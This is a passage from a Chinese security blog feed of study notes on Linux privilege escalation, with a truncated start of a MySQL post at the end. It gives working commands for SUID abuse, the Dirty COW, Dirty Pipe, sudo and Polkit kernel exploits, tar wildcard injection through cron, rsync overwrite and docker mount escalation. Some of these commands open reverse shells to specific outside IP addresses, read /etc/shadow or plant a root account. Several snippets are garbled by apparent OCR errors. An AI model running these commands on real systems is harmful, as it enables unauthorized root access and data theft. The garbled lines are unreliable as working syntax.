class="hljs-comment">//pentestlab.blog/2017/09/25/suid-executables/</span><br></code></pre></td></tr></table></figure><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">nmap -V<br>nmap --interactive<br>nmap&gt; !sh<br>sh-<span class="hljs-number">3.2</span><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514232723.png" alt="微信截图_20230514232723"></p><h6 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">vim.tiny /etc shadow<br>vim.tiny<br><span class="hljs-comment"># Press ESC key</span><br>:set she11=/bin/sh<br>:she11<br></code></pre></td></tr></table></figure><h6 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">chmod u+x /usr/bin/find  <span class="hljs-comment">//赋予find的root权限</span><br><br>touch pentestTab<br>find pentestlab -exec whoami \; <span class="hljs-comment">//可以看见为root权限</span><br>----<br>find pentestlab -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<span class="hljs-comment">//执行反弹命令</span><br>----<br>netcat <span class="hljs-number">192.1681</span>.<span class="hljs-number">189</span> <span class="hljs-number">5555</span><br>id<br>cat /etc/shadow<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514231952.png" alt="微信截图_20230514231952"></p><h6 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="More"><a href="#More" class="headerlink" title="More"></a>More</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h6 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">touch yeye<br>find yeye -exec whoami \;<br>shell 生成网址: https:<span class="hljs-comment">//forum.ywhack.com/shell.php</span><br><br>利用NC反弹:<br>find yeye -exec netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<br>netcat xx.xx.xx.xx <span class="hljs-number">5555</span><br>  <br>利用Python反弹:<br>find yeye -exec python -c <span class="hljs-string">&#x27;import</span><br><span class="hljs-string">socket ,subprocess ,os :s=socket ,socket(socket,AF_INET,socket ,SOCK STREAM) :s , connect((&quot;47 .94.236.117&quot; 7777));os ,dup2(s ,fieno() , 0) ;os ,dup2(s ,fileno() ,1);os ,dup2(s ,fileno() ,2);p=slbprocess .ca11([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;<br><br>nc -lvp <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><h4 id="普通EXP"><a href="#普通EXP" class="headerlink" title="普通EXP"></a>普通EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 提权过程: 连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</span><br>探针项目: BeRoot linux-exploit-suggester linux-exploit-suggester2<br>  <br>zip xxx make<br>.c gcc <span class="hljs-number">45010</span>.c -o exp<br>chmod +x exp<br>./exp<br>id<br><span class="hljs-comment">// 通过探针结果---&gt;下载对应exp脚本---》编译 (.c/makefile) /运行</span><br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230514235112.png" alt="微信截图_20230514235112"></p><h4 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权(CVE-2016-5195)"></a>脏牛提权(CVE-2016-5195)</h4><h6 id="lampiao靶场复现"><a href="#lampiao靶场复现" class="headerlink" title="lampiao靶场复现"></a>lampiao靶场复现</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">// 脏牛提权(CVE-2016-5195)</span><br>内核提权整个过程: (linux-exploit-suggester获取信息哦)<br>内核漏洞提权过程: 寻可用-下exp-上/tmp-编译exp-执行(无权限用chmod)<br>nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">46.0</span>/<span class="hljs-number">24</span><br>nmap -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">46.144</span><br>search drupal<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">unix</span>/<span class="hljs-title">webapp</span>/<span class="hljs-title">drupal_drupalgeddon2</span><br><span class="hljs-title">set</span> <span class="hljs-title">rhost</span> 192.168,46.144<br><span class="hljs-title">set</span> <span class="hljs-title">rport</span> 1898<br><span class="hljs-title">run</span><br>===脏牛提权===<br><span class="hljs-title">upload</span> /<span class="hljs-title">root</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> /<span class="hljs-title">tmp</span>/<span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span><br><span class="hljs-title">g</span>++ -<span class="hljs-title">Wall</span> -<span class="hljs-title">pedantic</span> -<span class="hljs-title">O2</span> -<span class="hljs-title">std</span>=<span class="hljs-title">c</span>++11 -<span class="hljs-title">pthread</span> -<span class="hljs-title">o</span> <span class="hljs-title">dcow</span> <span class="hljs-title">dcow</span>.<span class="hljs-title">cpp</span> -<span class="hljs-title">lutil</span><br><span class="hljs-title">python</span> -<span class="hljs-title">c</span> &#x27;<span class="hljs-title">import</span> <span class="hljs-title">pty</span>; pty.<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">./dcow</span><br><span class="hljs-string">su root</span><br></code></pre></td></tr></table></figure><h4 id="脏管提权-CVE-2022-0847"><a href="#脏管提权-CVE-2022-0847" class="headerlink" title="脏管提权(CVE-2022-0847)"></a>脏管提权(CVE-2022-0847)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">方法 劫持[SUID](https:<span class="hljs-comment">//so.csdn.net/so/search?q=SUID&amp;spm=1001.2101.3001.7020)文件/root</span><br></code></pre></td></tr></table></figure><p>方法一：劫持<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dirty Pipe(CVE-2022-0847)<br>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102<br>查看内核版本 <span class="hljs-built_in">uname</span> -srm<br><br>wget https://haxx.in/files/dirtypipez.c<br>gcc -std=c99 dirtypipez.c -o dirtypipez<br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br>./dirtypipez /usr/bin/su  <span class="hljs-comment">#任何具体suid权限的文件均可</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>方法二：复写&#x2F;etc&#x2F;passwd</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./compile.sh</span>               <br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-keyword">ls</span><br>compile.sh  exploit  exploit.c  LICENSE.txt  README.md<br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./exploit</span>   <br>Backing up <span class="hljs-string">/etc/passwd</span> to <span class="hljs-string">/tmp/passwd.bak</span> <span class="hljs-string">...</span><br>Setting root password to <span class="hljs-string">&quot;aaron&quot;</span><span class="hljs-string">...</span><br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ su<br>Password: <br><span class="hljs-comment"># id</span><br>uid=0<span class="hljs-params">(root)</span> gid=0<span class="hljs-params">(root)</span> groups=0<span class="hljs-params">(root)</span>,4<span class="hljs-params">(adm)</span>,20<span class="hljs-params">(dialout)</span>,119<span class="hljs-params">(wireshark)</span>,142<span class="hljs-params">(kaboxer)</span><br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>方法三</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">脚本运行  bash Dirty-<span class="hljs-built_in">Pipe</span>.sh<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230515141911.png" alt="微信截图_20230515141911"></p><h4 id="SUDO-CVE-2021-3156"><a href="#SUDO-CVE-2021-3156" class="headerlink" title="SUDO(CVE-2021-3156)"></a>SUDO(CVE-2021-3156)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">sudo -V<br>sudo: <span class="hljs-number">1.8</span>.<span class="hljs-number">2</span> - <span class="hljs-number">1.8</span>.<span class="hljs-number">31</span>p2<br>sudo: <span class="hljs-number">1.9</span>.<span class="hljs-number">0</span> - <span class="hljs-number">1.9</span>.<span class="hljs-number">5</span>p1<br>-判断: sudoedit -s / 报错存在。则漏洞存在-利用:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/blasty/CVE-2021-3156.gitcd CVE-2021-3156</span><br>make<br>chmod a+x sudo-hax-me-a-sandwich./sudo-hax-me-a-sandwich <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Polkit-CVE-2021-4034"><a href="#Polkit-CVE-2021-4034" class="headerlink" title="Polkit(CVE-2021-4034)"></a>Polkit(CVE-2021-4034)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">漏洞影响<span class="hljs-number">2009</span>年<span class="hljs-number">5</span>月至今的所有polkit版本<br>由于polkit是系统预装工具，所有存在polkit的<span class="hljs-number">1</span>inux系统均受影响如: Centos、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等-判断: dpkg -<span class="hljs-number">1</span> policykit-<span class="hljs-number">1</span>-利用:<br>git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/berdav/CVE-2021-4034.gitcd CVE-2021-4034/</span><br>make<br>./cve-<span class="hljs-number">2021</span>-<span class="hljs-number">4034</span><br></code></pre></td></tr></table></figure><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ROOT用户对某个第三方程序给予了SUID权限<br></code></pre></td></tr></table></figure><h5 id="探测-1"><a href="#探测-1" class="headerlink" title="探测"></a>探测</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">探针: <span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">首先root用户操作:<br>root用户讲可执行文件进行编译，<br>保证文件的正常授权运行，给予ROOT权限执行<br>gcc demo.c -o shell<br>chmod u+s shell<br>其次普通用户操作:<br>普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限<br>  cp /bin/bash /tmp/ps<br>  export PATH=/tmp:<span class="hljs-variable">$PATH</span><br>  ./shell<br>  id<br>过程分析:<br><span class="hljs-number">1</span>.先获取suid程序<br><span class="hljs-number">2</span>.去除系统自带的<br><span class="hljs-number">3</span>.下载这个程序进行反编译<br></code></pre></td></tr></table></figure><p><img src="/image/1-16841344324143.png" alt="1"></p><p><img src="/image/2-16841344324144.png" alt="2"></p><p><img src="/image/3.png" alt="3"></p><p><img src="/image/4-16841344324122.png" alt="4"></p><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><p>定时任务&amp;tar&amp;suid<br>&#x2F;etc&#x2F;crontab</p><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">利用定时任务配置不规范导致的安全风险<br>例如 执行的脚本(xx.<span class="hljs-keyword">sh</span>) 如下<br><span class="hljs-keyword">cd</span> /tmp;tar zxf bckup.tar .gz*<br>在文件名“bckup.tar.gz*”的末尾的星号 (*) 是一个通配符，匹配当前目录中以“bckup,tar.gz”开头并在其后有其他字符的任何文件。当一个归档文件被分成多个文件以便于传输或存储时，这非常有用。这样当文件夹下面有列入“--checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>”的文件时。就会有如下效果-&gt;tar zxf bckup.tar.gz --checkpoint-action=exec=<span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span>--&gt;tar zxf bckup ,tar.gz --checkpoint=1<br></code></pre></td></tr></table></figure><h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 提权通过获取计划任务执行文件信息进行提权</span><br><span class="hljs-number">1</span>、相对路径和绝对路径执行<br><span class="hljs-number">2</span>、计划任务命令存在参数调用<br></code></pre></td></tr></table></figure><h6 id="复现条件"><a href="#复现条件" class="headerlink" title="复现条件"></a>复现条件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.上传环境复现定时脚本:bak.sh<br>cd /tmp;tar lzxf bckup.tar .gz<br>cd /tmp;tar czf /tmp/backup.tar.gz *<br>  (注意上传后要赋权 chmod +x bak.sh)<br><span class="hljs-number">2</span>.配置定时任务:<br>    */<span class="hljs-number">1</span> * * * * root /tmp/bak.sh<br><span class="hljs-number">3</span>.开启定时任务:<br>   /sbin/service crond start<br>crontab -u root -l<br>---定时相关其他命令---/sbin/service crond stop <span class="hljs-comment">//关闭服务</span><br>/sbin/service crond restart <span class="hljs-comment">//重启服务</span><br>/sbin/service crond reload <span class="hljs-comment">//重新载入配置</span><br>/sbin/service crond status <span class="hljs-comment">//启动服务</span><br></code></pre></td></tr></table></figure><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">在相关命令下执行目录。利用计划任务的备份功能tar命令的参数利用<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span>  <span class="hljs-comment">#以命令参数命名的文件</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; test.sh<br>chmod +x test.sh<br>==》等待定时任务被执行<br>运行 ./bash -<span class="hljs-title function_ invoke__">p</span>(到这相当于用SUID提权)<br></code></pre></td></tr></table></figure><h3 id="定时任务-文件权限"><a href="#定时任务-文件权限" class="headerlink" title="定时任务&amp;文件权限"></a>定时任务&amp;文件权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">同样以上面这个定时任务为例子假如，root用户给这个脚本赋权的时候 用的<span class="hljs-number">777</span> 或者 <span class="hljs-number">775</span> 赋权<br>那么我们低配用户。就有修改这个脚本的权限<br><br><span class="hljs-comment">// 可修改为反弹命令</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230505170751181.png" alt="image-20230505170751181"></p><h3 id="Rsync-未授权访问提权"><a href="#Rsync-未授权访问提权" class="headerlink" title="Rsync(未授权访问提权)"></a>Rsync(未授权访问提权)</h3><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">Rsync是linux下一款数据备份工具，默认开启<span class="hljs-number">873</span>端口借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接覆盖<br>环境搭建<span class="hljs-number">1</span>:<br>https:<span class="hljs-comment">//vulhub.org/#/environments/rsync/common/</span><br><span class="hljs-comment">#可选</span><br>docker-compose build<br>docker-compose upload<br>环境搭建<span class="hljs-number">2</span>:<br>或者在线靶场:<br>https:<span class="hljs-comment">//vulfocus.cn/#/dashboard</span><br>环境搭建<span class="hljs-number">3</span>:<br>yum -y install rsync <br>vim /etc/rsyncd.conf 配置一下 （配置文件在环境搭建文件夹里面）<br>rsync --daemon<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516102123.png" alt="微信截图_20230516102123"></p><h5 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">rsync rsync:<span class="hljs-comment">//ip:873</span><br>rsync rsync:<span class="hljs-comment">//192.168.156.135:873/src</span><br><span class="hljs-number">123</span> <span class="hljs-number">.58</span>.<span class="hljs-number">224.8</span>:<span class="hljs-number">55295</span><br>-提权过程:<br><span class="hljs-number">1</span>、创建一个nc文件，内容<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span>/<span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-number">2</span>、赋予执行权限:<br>chmod +x nc<br><span class="hljs-number">3</span>、上传文件覆盖定时任务目录下<br>rsync -av nc rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/cron.hourly/</span><br><span class="hljs-number">4</span>、下载文件<br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/crontab ./</span><br>rsync -av rsync:<span class="hljs-comment">//192.168.156.135:873/src/etc/passwd ./</span><br><span class="hljs-number">5</span>、进行nc 监听相应的端口<br>nc -lvp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/image/QQ%E6%88%AA%E5%9B%BE20230516115704.jpg" alt="QQ截图20230516115704"></p><h3 id="Docker组挂载"><a href="#Docker组挂载" class="headerlink" title="Docker组挂载"></a>Docker组挂载</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// root --&gt; docker --&gt;images</span><br><span class="hljs-comment">// boy --&gt; docker</span><br></code></pre></td></tr></table></figure><h5 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">普通用户在docker组，利用docker服务启动镜像挂载目录<br>从而来访问root目录、etc目录等敏感文件来进行权限提升。<br>-复现: 创建用户归类目录，添加到docker组<br>useradd test<br>passwd test<br>用root用户去改test用户的所属组，使test用户进入到docker组里<br>usermod -G docker test<span class="hljs-comment">#添加test用户到docker组</span><br>newgrp docker <span class="hljs-comment">#更新docker组</span><br></code></pre></td></tr></table></figure><h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">拉取alpine镜像<br>$ docker pull hub-mirror.c.<span class="hljs-number">163</span>.com/library/alpine<br>$ docker pull registry.cn-hangzhou.aliyuncs.com/library/alpine<br>启动alpine镜像<br>docker run -v /root:/mnt -it alpine<br>主要的作用是: 从Docker上面下载alpine镜像，然后运行;<br>-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。<br>docker run -v /etc:/mnt -it alpine<br>cd /mnt<br>id  <span class="hljs-comment">#提升到了root权限</span><br>ls  <span class="hljs-comment">#可看见/etc中的内容。并且可以修改</span><br>-------------------<br>常见问题<br>-------------------<br>alpine 镜像是什么?<br>alpine 镜像通常被用作轻量级的基础镜像，用于构建容器化应用。由于其体积小,可以快速地下载和部署效地减小镜像的大小，减少镜像构建和部署的时间。<br>同时也能有<br>etc 目录下，shadow与passwd区别?<br>  /etc/shadow 文件包含了所有系统用户的密码散列值以及其他与密码相关的信息，例如密码最后一次修改的时间、密码过期时间、账户是否被锁定等等。这个文件的每一行都对应一个用户。<br>passwd中密码部分为x的原因?<br>在/etc/passwd文件中，密码字段的通常被设置为“x”或“*”字符，这意味着密码存储在/etc/shadow文件中。这样做的目的是为了保护密码信息的安全性，避免让未经授权的用户通过查看/etc/passwd文件来获得密码信息。只有系统管理员和特定的用户才有权限查看/etc/shadow文件，因为它包含了经过哈希处理的密码信息。<br></code></pre></td></tr></table></figure><h5 id="深入利用"><a href="#深入利用" class="headerlink" title="深入利用"></a>深入利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">openssl passwd -<span class="hljs-number">1</span> -salt raj<br>获取到密码: $<span class="hljs-number">1</span>SrajscgoI1m5chsDvPuQrsxOuuO<br><span class="hljs-comment">// 在/etc/passwd文件后面添加相应内容，实现通过passwd添加特权账号</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;raj:&lt;上面获取到的密钥&gt;:0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql数据库提权</title>
    <link href="/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <url>/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="权限提升-数据库"><a href="#权限提升-数据库" class="headerlink" title="权限提升-数据库"></a>权限提升-数据库</h2><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 数据库的最高权限用户的密码</span><br>-secure-fle-priv没进行目录限制<br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure fle priv&quot;</span>;<br><span class="hljs-number">0</span>、网站存在高权限SOL注入点<br><span class="hljs-number">1</span>、数据库的存储文件或备份文件<br><span class="hljs-number">2</span>、网站应用源码中的数据库配置文件<br><span class="hljs-number">3</span>、采用工具或脚本爆破(需解决外联问题)<br></code></pre></td></tr></table></figure><h5 id="账号密码获取"><a href="#账号密码获取" class="headerlink" title="账号密码获取"></a>账号密码获取</h5><figure class="highlight php"><table><tr><td 